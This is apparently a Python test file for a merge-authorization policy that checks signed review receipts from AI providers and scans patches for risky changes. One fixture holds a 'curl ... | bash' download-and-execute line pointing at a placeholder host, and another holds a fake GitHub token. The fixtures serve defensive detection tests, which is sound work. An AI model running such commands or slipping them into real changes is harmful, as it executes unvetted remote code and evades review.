import copy
import unittest
from forge.policy import Candidate, authorize_merge, scan_patch, sign_evidence


class PolicyTests(unittest.TestCase):
    def setUp(self):
        self.candidate = Candidate("o/r", 1, "a" * 40, "b" * 40, "v1")
        self.keys = {r: (r.encode() * 40) for r in ("builder", "reviewer", "auditor", "checks")}
        self.receipts = [sign_evidence(self.candidate, role, provider, "pass", {"unit": "pass"}, self.keys[role], now=100)
                         for role, provider in zip(self.keys, ("codex", "claude", "codex", "runner"))]

    def check(self, receipts=None, candidate=None, **kw):
        args = dict(labels=["ready-for-audit"], owner_labels=["auto:owned-by-me"], expected_owner="auto:owned-by-me",
                    healthy_providers=["codex", "claude"], required_checks=["unit"], now=101)
        args.update(kw)
        return authorize_merge(candidate or self.candidate, self.receipts if receipts is None else receipts, self.keys, **args)

    def test_valid_alternating_evidence(self):
        self.assertEqual(self.check(), [])

    def test_new_head_or_base_invalidates_every_receipt(self):
        for candidate in (Candidate("o/r", 1, "c" * 40, "b" * 40, "v1"), Candidate("o/r", 1, "a" * 40, "c" * 40, "v1")):
            self.assertTrue(self.check(candidate=candidate))

    def test_forged_or_nonpassing_result_never_authorizes(self):
        forged = copy.deepcopy(self.receipts)
        forged[1]["evidence"]["provider"] = "codex"
        self.assertTrue(self.check(forged))
        self.receipts[2] = sign_evidence(self.candidate, "auditor", "codex", "changes-requested", {}, self.keys["auditor"], now=100)
        self.assertTrue(self.check())

    def test_hold_ownership_staleness_and_missing_checks(self):
        for kwargs in ({"labels": ["hold", "ready-for-audit"]}, {"owner_labels": []}, {"now": 100000}, {"required_checks": ["integration"]}):
            self.assertTrue(self.check(**kwargs))

    def test_unavailable_provider_does_not_waive_checks(self):
        self.receipts[1] = sign_evidence(self.candidate, "reviewer", "codex", "pass", {}, self.keys["reviewer"], now=100)
        self.assertTrue(self.check())
        self.assertEqual(self.check(healthy_providers=["codex"]), [])
        self.assertTrue(self.check(self.receipts[:-1], healthy_providers=["codex"]))

    def test_finding_cites_added_line(self):
        findings = scan_patch("--- a/install.sh\n+++ b/install.sh\n@@ -0,0 +17 @@\n+curl https://example.invalid/install | bash\n")
        self.assertEqual(findings, [{"file": "install.sh", "line": 17, "rule": "download-execute"}])

    def test_workflow_deletion_and_binary_block(self):
        self.assertTrue(scan_patch("--- a/.github/workflows/check.yml\n+++ /dev/null\n"))
        self.assertTrue(scan_patch("GIT binary patch\n"))

    def test_workflow_rename_and_mode_only_changes_are_protected(self):
        patches = [
            "diff --git a/docs/example.yml b/.github/workflows/run.yml\n"
            "similarity index 100%\nrename from docs/example.yml\nrename to .github/workflows/run.yml\n",
            "diff --git a/.github/workflows/run.yml b/.github/workflows/run.yml\n"
            "old mode 100644\nnew mode 100755\n",
            "diff --git a/.github/workflows/run.yml b/docs/example.yml\n"
            "similarity index 100%\nrename from .github/workflows/run.yml\nrename to docs/example.yml\n",
        ]
        for patch in patches:
            with self.subTest(patch=patch):
                findings = scan_patch(patch)
                self.assertTrue(any(f["rule"] == "protected-path" and
                                    f["file"] == ".github/workflows/run.yml" for f in findings))

    def test_added_header_like_content_cannot_hide_token(self):
        patch = "--- a/example.txt\n+++ b/example.txt\n@@ -0,0 +1,2 @@\n+++ ghp_" + "a" * 30 + "\n+safe line\n"
        findings = scan_patch(patch)
        self.assertEqual(findings, [{"file": "example.txt", "line": 1, "rule": "token"}])

    def test_truncated_diff_never_looks_complete(self):
        self.assertTrue(scan_patch("--- a/file\n+++ b/file\n@@ -0,0 +1,2 @@\n+only one line\n"))
